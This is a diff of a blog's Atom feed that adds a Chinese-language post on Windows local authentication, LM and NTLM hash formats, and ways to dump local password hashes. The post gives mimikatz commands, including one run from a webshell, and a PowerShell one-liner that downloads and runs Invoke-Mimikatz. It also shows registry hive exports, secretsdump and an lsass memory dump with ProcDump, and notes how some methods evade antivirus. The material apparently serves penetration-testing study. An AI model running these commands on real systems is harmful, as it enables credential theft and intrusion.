@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zzggtt.github.io</id>
     <title>ZG0T01</title>
-    <updated>2020-11-14T14:17:32.143Z</updated>
+    <updated>2020-11-16T14:07:48.992Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zzggtt.github.io"/>
     <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
@@ -10,6 +10,149 @@
     <logo>https://zzggtt.github.io/images/avatar.png</logo>
     <icon>https://zzggtt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, ZG0T01</rights>
+    <entry>
+        <title type="html"><![CDATA[window本地认证与hash抓取]]></title>
+        <id>https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/</id>
+        <link href="https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/">
+        </link>
+        <updated>2020-11-16T14:06:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="windows本地认证">Windows本地认证</h3>
+<p>登陆到本机的过程：</p>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605535647568.png" alt="" loading="lazy"></figure>
+<ol>
+<li>用户首先按Ctrl+Alt+Del组合键。</li>
+<li>Winlogon检测到用户按下SAS键，就调用GINA，由GINA显示登录对话框，以便用户输入账号和密码。</li>
+<li>用户输入账号和密码，确定后，GINA把信息发送给LSA进行验证。</li>
+<li>在用户登录到本机的情况下，LSA会调用Msv1_0.dll这个验证程序包，将用户信息处理后生成密钥，同SAM数据库中存储的密钥进行对比。</li>
+<li>如果对比后发现用户有效，SAM会将用户的SID，用户所属用户组的SID，和其他一些相关信息发送给LSA。</li>
+<li>LSA将收到的SID信息创建安全访问令牌，然后将令牌的句柄和登录信息发送给Winlogon.exe。</li>
+<li>Winlogon.exe对用户登录稍作处理后，完成整个登录过程。</li>
+</ol>
+<p>可以看出本地用户的密码是存储在SAM文件中。它用于储存本地所有用户的凭证信息，位于：<strong>C:\Windows\System32\config\sam</strong>。</p>
+<p>Windows不会存储文明密码的，而是存储密码的hash值，上诉第四步中所说的密钥就是<strong>密码hash</strong>。</p>
+<p><strong>参考：</strong></p>
+<p><a href="https://blog.csdn.net/u013776188/article/details/79986479">Windows本地登陆</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/">渗透技巧——Windows中Credential Manager的信息获取</a></p>
+<p><a href="https://xz.aliyun.com/t/8127#toc-3">由Windows本地认证到Hash抓取</a></p>
+<h3 id="windows-hash">Windows hash</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+<th style="text-align:left">2000</th>
+<th style="text-align:left">xp</th>
+<th style="text-align:left">2003</th>
+<th style="text-align:left">Vista</th>
+<th style="text-align:left">win7</th>
+<th style="text-align:left">2008</th>
+<th style="text-align:left">2012</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">LM</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">NTLM</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">√</td>
+<td style="text-align:left">√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody>
+</table>
+<p>Windows使用的hash有：<strong>LMHASH</strong>和<strong>NTLMHASH</strong>。</p>
+<ul>
+<li>
+<p><strong>LM HASH</strong></p>
+<p>lmhash作为Windows早期使用的密码hash，其加密流程如下：</p>
+<p>1、密码长度<strong>限制为14个字符</strong></p>
+<p>2、密码全部转换为大写</p>
+<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
+<p>4、密码的16进制字符串被分成两个7byte部分</p>
+<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
+<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
+<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
+</li>
+<li>
+<p><strong>NTLM HASH</strong></p>
+<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash，其加密流程如下：</p>
+<p>1、先将用户密码转换为十六进制格式。</p>
+<p>2、将十六进制格式的密码进行Unicode编码。</p>
+<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
+<p>其格式如下：</p>
+<pre><code class="language-bash">username:SID:LM-Hash:NTLM-Hash
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre>
+<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee（这表示<strong>空密码或者是未使用LM_HASH</strong>）</p>
+<p>在hash传递攻击时，可以替换成0：</p>
+<p>00000000000000000000000000000000</p>
+</li>
+</ul>
+<p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">红蓝对抗之Windows内网渗透</a></p>
+<p><a href="https://github.com/l3m0n/pentest_study">从零开始学内网渗透</a></p>
+<h3 id="本地hash抓取">本地hash抓取</h3>
+<h4 id="mimikatz">mimikatz</h4>
+<p>只能抓取登陆过的用户hash，无法抓取所有用户，需要免杀：</p>
+<ul>
+<li>
+<p>meterpreter中直抓取内存中的hash：</p>
+<pre><code class="language-bash">mimikatz_command -f  samdump::hashes
+</code></pre>
+</li>
+<li>
+<p>meterpreter中直抓取内存中的明文密码：</p>
+<pre><code class="language-bash">mimikatz_command -f sekurlsa::logonpasswords
+</code></pre>
+</li>
+<li>
+<p>非交互式抓明文密码(webshell中)</p>
+<pre><code class="language-bash">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt
+</code></pre>
+</li>
+<li>
+<p>powershell加载mimikatz抓取密码</p>
+<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
+</code></pre>
+</li>
+</ul>
+<p>MSF中mimikatz使用参考：https://blog.csdn.net/weixin_45116657/article/details/103147716</p>
+<h4 id="reg">reg</h4>
+<p>Win2000和XP需要先提到SYSTEM，03开始直接可以reg save，导出的文件大，效率低，但是可以绕过杀软。</p>
+<p>在meterpreter中使用shell命令来到交互式cmd，然后<strong>导出注册表</strong>：</p>
+<p>（在c盘下就导出了三个注册表文件）</p>
+<pre><code class="language-bash">reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+reg save hklm\security security.hive
+</code></pre>
+<p>使用meterpreter下自带download功能来将目标机的三个注册表文件下载下来，</p>
+<p>然后<strong>本地分析：</strong></p>
+<p>（默认使用kali）</p>
+<pre><code class="language-bash">python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
+</code></pre>
+<p>参考：https://blog.csdn.net/qq_17204441/article/details/89426390</p>
+<h4 id="procdump-mimikatz">ProcDump + Mimikatz</h4>
+<p>本地分析，文件会比较大，但是能绕过杀软。</p>
+<p>通过procdump（<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">下载地址</a>）导出注册表：</p>
+<pre><code class="language-bash">Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<p>然后通过mimikatz进行读取：</p>
+<pre><code class="language-bash">sekurlsa::minidump lsass.dump.dmp
+sekurlsa::logonpasswords full
+</code></pre>
+<p>PS：mimikatz的平台要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Windows下提权]]></title>
         <id>https://zzggtt.github.io/post/windows-xia-ti-quan/</id>
